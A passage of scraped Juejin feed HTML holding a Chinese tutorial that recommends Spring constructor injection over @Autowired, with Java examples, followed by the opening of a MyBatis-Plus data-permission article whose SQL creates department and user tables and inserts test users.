0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、为什么不建议使用@Autowired</h2>
<p>在Spring开发中，@Autowired注解虽能实现依赖注入，但受其设计特性影响，存在可读性、对象完整性及歧义注入等问题，逐渐不再被推荐用于实际开发。核心原因可归纳为以下三点：</p>
<h3 data-id="heading-1">降低代码可读性与明确性</h3>
<p>@Autowired属于“<strong>隐式注入</strong>”，依赖Spring自动装配机制完成Bean注入，开发者<strong>无法直观判断注入Bean的来源</strong>、扫描范围及装配逻辑。相较于显式注入，阅读代码时需额外追溯Bean的定义位置与匹配规则，增加理解成本。</p>
<h3 data-id="heading-2">Bean初始化阶段使用的是不完整的对象</h3>
<p>这是@Autowired 易被忽视的核心问题。Spring初始化Bean时，若通@Autowired注入依赖，且同时在初始化阶段（如执行@PostConstruct 方法）内调用了Bean的业务方法，但此时依赖的Bean尚未完全初始化完成，即使用“<strong>不完整对象</strong>”执行操作，引发不可预期的异常。<strong>这种情况常发生在循环依赖的情景下</strong></p>
<h3 data-id="heading-3">多Bean匹配时存在歧义风险</h3>
<p>当容器中存在多个同类型Bean时，@Autowired需依赖@Primary注解、变量名匹配等额外规则筛选最优解，若规则设置不当、后期Bean定义被修改，或团队成员不熟悉筛选优先级，极易出现歧义注入问题。这种问题无法在编译期察觉，仅在运行时抛出NoUniqueBeanDefinitionException，排查难度大，且可能因注入错误Bean导致业务逻辑异常，影响系统可靠性与稳定性。</p>
<h2 data-id="heading-4">二、@Autowired 查找Bean的完整规则</h2>
<p>@Autowired的核心逻辑是“<strong>先按类型匹配，再按优先级筛选</strong>”，其完整的Bean查找与注入流程如下</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A["开始：Spring尝试注入Bean"] --&gt; B{"候选Bean数量 &gt; 1？"}
    B -- 否 --&gt; C["直接注入该唯一Bean"] --&gt; D["注入完成"]
    B -- 是 --&gt; E{"检查是否有@Primary注解的Bean？"}
    %% 多Bean场景的优先级筛选逻辑
    E -- 有 --&gt; F["选择标注@Primary的Bean注入&lt;br/&gt;（适用于明确默认实现的场景）"] --&gt; D
    E -- 无 --&gt; G{"检查变量名与Bean名称是否匹配？&lt;br/&gt;（仅字段/setter注入生效）"}
    G -- 匹配 --&gt; H["选择名称匹配的Bean注入&lt;br/&gt;（Bean名默认类名首字母小写，可自定义）"] --&gt; D
    G -- 不匹配 --&gt; I{"检查是否仅存在一个泛型匹配的Bean？"}
    I -- 是 --&gt; J["选择泛型匹配的Bean注入"] --&gt; D
    I -- 否 --&gt; K["抛出NoUniqueBeanDefinitionException异常&lt;br/&gt;（无唯一匹配的Bean）"] --&gt; D["结束"]
</code></pre>
<h4 data-id="heading-5">@Primary注解</h4>
<p>若某个候选Bean的实现类上添加了@Primary注解，Spring会优先选择该Bean注入。@Primary本质是告诉Spring“<strong>当存在多个同类型Bean时，优先使用我</strong>”，适用于明确某个Bean为默认实现的场景。例如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 接口定义</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// 两个实现类</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Primary</span> <span class="hljs-comment">// 标记为优先Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// 注入时，会优先注入DefaultUserService</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> UserService userService; <span class="hljs-comment">// 实际注入DefaultUserService</span>
</code></pre>
<h4 data-id="heading-6">变量名与Bean名称匹配</h4>
<p>若未指定@Primary，<strong>Spring会对比被注入变量的名称与候选Bean的名称</strong>（默认Bean名称为类名首字母小写），若存在完全匹配的Bean，则注入该Bean。需注意，此规则仅适用于字段注入和setter方法注入，构造函数注入不适用该规则。例如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("otherUserService")</span> <span class="hljs-comment">// 自定义Bean名称为otherUserService</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-meta">@Service</span> <span class="hljs-comment">// 默认Bean名称为defaultUserService</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// 变量名与OtherUserService的Bean名称一致，注入OtherUserService</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> UserService otherUserService;
</code></pre>
<h4 data-id="heading-7">泛型匹配筛选</h4>
<p>在泛型Bean场景中，若多个候选Bean的原始类型相同，但泛型参数不同，Spring会筛选出与目标注入位置泛型参数一致的Bean。这种场景常见于通用组件封装，例如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 泛型接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BaseDao</span>&lt;T&gt; {}
<span class="hljs-comment">// 两个泛型实现类</span>
<span class="hljs-meta">@Repository</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseDao</span>&lt;User&gt; {}
<span class="hljs-meta">@Repository</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseDao</span>&lt;Order&gt; {}
<span class="hljs-comment">// 注入时，根据泛型参数匹配对应的Bean</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> BaseDao&lt;User&gt; userDao; <span class="hljs-comment">// 注入UserDao</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> BaseDao&lt;Order&gt; orderDao; <span class="hljs-comment">// 注入OrderDao</span>
</code></pre>
<p>若仅存在一个与目标泛型匹配的实现类，无论是否有其他同原始类型Bean，都会优先注入该泛型匹配的Bean。</p>
<h2 data-id="heading-8">三、Spring Boot推荐的依赖注入方式</h2>
<p>针对上述@Autowired的三大问题，Spring Boot官方推荐使用“<strong>显式注入</strong>”方式，核心原则是“明确依赖、保证对象完整性、规避歧义风险”，主要包括构造函数注入、setter方法注入，其中构造函数注入为最优推荐。</p>
<h3 data-id="heading-9">3.1 构造函数注入（推荐首选）</h3>
<p>构造函数注入是Spring Boot官方最推荐的注入方式，通过类的构造函数声明依赖，Spring容器在初始化Bean时，会通过构造函数传入依赖的Bean。其优势极为显著，是目前企业级开发的主流选择。</p>
<h4 data-id="heading-10">3.1.1 优势和问题</h4>
<p><strong>优势：</strong></p>
<ul>
<li><strong>显式声明依赖</strong>：<strong>解决问题1</strong>，依赖关系在构造函数中明确体现，开发者可直观了解Bean的依赖项，提升代码可读性和维护性。</li>
<li><strong>强制依赖实例化</strong>：<strong>解决问题2</strong>，存在循环依赖的bean，如果都是通过构造函数依赖，那么将无法实例化，将在启动时报错，不会出现不完整对象被调用的问题</li>
<li><strong>支持不可变对象</strong>：可将注入的依赖声明为final变量，一旦初始化完成便无法修改，保证线程安全。</li>
<li><strong>低耦合，可测试性强</strong>：脱离Spring容器时，可直接通过构造函数传入模拟Bean（如Mockito生成的Mock对象），单元测试简单高效，不依赖Spring Test上下文。</li>
</ul>
<p><strong>问题：</strong></p>
<ul>
<li><strong>第三点问题依然存在</strong>，即多Bean匹配时存在歧义风险</li>
</ul>
<h4 data-id="heading-11">3.1.2 代码示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserDao userDao;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderService orderService;
    <span class="hljs-comment">// 构造函数注入，Spring 4.3+可省略@Autowired注解</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserServiceImpl</span><span class="hljs-params">(UserDao userDao, OrderService orderService)</span> {
        <span class="hljs-built_in">this</span>.userDao = userDao;
        <span class="hljs-built_in">this</span>.orderService = orderService;
    }
    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> userDao.selectById(id);
    }
}
</code></pre>
<p>注：Spring 4.3及以上版本，对于只有一个构造函数的Bean，可省略构造函数上的@Autowired注解，Spring会自动通过该构造函数注入依赖，进一步简化代码。</p>
<h3 data-id="heading-12">3.2 Setter方法注入</h3>
<p>Setter方法注入通过setter方法声明依赖，Spring容器在初始化Bean后，调用对应的setter方法注入依赖。这种方式适用于“可选依赖”场景，即依赖不是Bean正常工作的必要条件。</p>
<h4 data-id="heading-13">3.2.1 优势和问题</h4>
<p><strong>优势：</strong></p>
<ul>
<li><strong>支持可选依赖</strong>：可通过setter方法的默认实现或条件判断，处理依赖不存在的场景，灵活性较高。</li>
<li><strong>支持依赖动态修改</strong>：在Bean生命周期中，可通过调用setter方法更新依赖（需注意线程安全问题）。</li>
</ul>
<p><strong>问题：</strong></p>
<ul>
<li><strong>不能解决开始提到的三点问题，但确实带来了一些灵活性</strong></li>
<li>Setter方法注入不适用于强制依赖场景，否则可能因依赖未注入导致空指针异常</li>
<li>无法声明final变量，安全性低于构造函数注入。</li>
</ul>
<h4 data-id="heading-14">3.2.2 代码示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">private</span> UserDao userDao;
    <span class="hljs-keyword">private</span> OrderService orderService;
    <span class="hljs-comment">// Setter方法注入，需添加@Autowired注解</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserDao</span><span class="hljs-params">(UserDao userDao)</span> {
        <span class="hljs-built_in">this</span>.userDao = userDao;
    }
    <span class="hljs-comment">// 可选依赖，设置默认值或空判断</span>
    <span class="hljs-meta">@Autowired(required = false)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderService</span><span class="hljs-params">(OrderService orderService)</span> {
        <span class="hljs-built_in">this</span>.orderService = orderService;
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userDao.selectById(id);
        <span class="hljs-keyword">if</span> (orderService != <span class="hljs-literal">null</span>) {
            orderService.updateUserOrderCount(id);
        }
        <span class="hljs-keyword">return</span> user;
    }
}
</code></pre>
<h3 data-id="heading-15">3.3 @Resource注解注入</h3>
<p>@Resource注解（JSR-250规范）也是一种常用的显式注入方式，其与@Autowired的核心区别在于：@Resource按“名称优先，类型次之”匹配Bean。</p>
<h4 data-id="heading-16">3.3.1 优势和问题</h4>
<p><strong>优势：</strong></p>
<ul>
<li>不依赖Spring框架，耦合度更低。</li>
<li>可以指定名称，<strong>解决问题3</strong></li>
</ul>
<p><strong>问题：</strong></p>
<ul>
<li><strong>无法解决问题1和2</strong></li>
<li>@Resource不支持@Primary注解，</li>
<li>不支持构造函数注入，仅适用于字段注入和setter方法注入，可作为构造函数注入的补充场景使用。</li>
</ul>
<h4 data-id="heading-17">3.3.2 代码示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-comment">// 按Bean名称注入（默认匹配变量名，可通过name属性指定）</span>
    <span class="hljs-meta">@Resource(name = "userDao")</span>
    <span class="hljs-keyword">private</span> UserDao userDao;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> userDao.selectById(id);
    }
}
</code></pre>
<h2 data-id="heading-18">四、总结</h2>
<ul>
<li>@Autowired虽能实现依赖注入，但因隐式注入降低可读性、可能使用不完整对象、多Bean场景存在歧义风险等问题，不符合Spring Boot“清晰、可靠、易维护”的设计理念，不建议在实际开发中使用。</li>
<li>Spring Boot推荐的构造函数注入，通过显式声明依赖、保证对象完整等特性，解决了@Autowired的诸多痛点，是企业级开发的最优选择；</li>
<li>Setter方法注入可作为可选依赖场景的补充，</li>
<li>@Resource则适用于低耦合的名称匹配场景。</li>
</ul>
<p>合理选择依赖注入方式，能显著提升代码质量、可维护性和系统稳定性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一个注解轻松实现数据权限]]></title>    <link>https://juejin.cn/post/7597622924272205851</link>    <guid>https://juejin.cn/post/7597622924272205851</guid>    <pubDate>2026-01-21T09:49:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597622924272205851" data-draft-id="7597622924272156699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一个注解轻松实现数据权限"/> <meta itemprop="keywords" content="MyBatis,面试"/> <meta itemprop="datePublished" content="2026-01-21T09:49:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明天有专业课"/> <meta itemprop="url" content="https://juejin.cn/user/860253654882618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一个注解轻松实现数据权限
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/860253654882618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明天有专业课
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:49:19.000Z" title="Wed Jan 21 2026 09:49:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>不知道在座的亦菲、彦祖们有没有遇到这样的需求，要在某块业务加上数据权限控制，规定哪些人能访问，哪些人不能访问。像这样的数据权限的控制该怎么实现呢？可以使用基于<code>Mybatis-Plus</code>的插件机制来实现。话不多说，我们直接切入主题，开始实现</p>
<h4 data-id="heading-0">代码</h4>
<h5 data-id="heading-1">数据库准备</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 插入部门表</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `department`;
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `department`  (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'部门ID'</span>,
  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'部门名称'</span>,
  `code` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'部门编码'</span>,
  `description` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'部门描述'</span>,
  `create_time` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE,
  <span class="hljs-keyword">UNIQUE</span> INDEX `code`(`code`) <span class="hljs-keyword">USING</span> BTREE
) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8mb4_bin ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;
<span class="hljs-comment">-- 插入用户表</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `<span class="hljs-keyword">user</span>`;
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">user</span>`  (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'用户ID'</span>,
  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户名'</span>,
  `password` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'密码'</span>,
  `phone` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_bin <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'手机号'</span>,
  `department_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'部门ID'</span>,
  `create_time` <span class="hljs-type">timestamp</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE,
  <span class="hljs-keyword">UNIQUE</span> INDEX `username`(`username`) <span class="hljs-keyword">USING</span> BTREE
) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">10</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8mb4_bin ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;
<span class="hljs-comment">-- 插入用户数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'testuser1'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138001'</span>, <span class="hljs-number">1</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'testuser2'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138002'</span>, <span class="hljs-number">2</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">'testuser3'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138003'</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">'tech_user1'</span>, <span class="hljs-string">'123456'</span>, <span class="hljs-string">'13800138004'</span>, <span class="hljs-number">1</span>, <span class="hljs-string">'2026-01-19 20:48:31'</span>);
